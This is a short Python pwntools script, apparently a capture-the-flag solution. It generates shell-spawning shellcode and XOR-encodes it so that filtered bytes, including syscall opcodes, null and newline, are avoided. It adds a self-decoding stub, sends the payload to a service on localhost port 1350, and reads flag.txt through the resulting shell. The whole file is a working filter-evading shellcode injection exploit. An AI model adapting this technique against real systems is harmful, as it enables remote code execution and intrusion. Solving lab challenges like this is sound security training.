from pwn import *

context.arch = "amd64"
bad = {0x00, 0x0a, 0x0f, 0x05, 0x2f, 0xcd}
body = asm(shellcraft.sh())
key = next(k for k in range(1, 256) if k not in bad and all((b ^ k) not in bad for b in body))
decoder = asm(f"""
    jmp get_body
decode:
    pop rsi
    push rsi
    xor ecx, ecx
    mov cl, {len(body)}
    mov al, {key}
decode_byte:
    xor byte ptr [rsi], al
    inc rsi
    loop decode_byte
    pop rsi
    jmp rsi
get_body:
    call decode
""")
payload = decoder + bytes(b ^ key for b in body)
assert len(payload) <= 192 and not set(payload) & bad

p = remote("localhost", 1350)
p.sendafter(b"Technique: ", payload)
p.recvuntil(b"Approved. The committee remains confidently underqualified.\n")
p.sendline(b"cat flag.txt")
p.interactive()
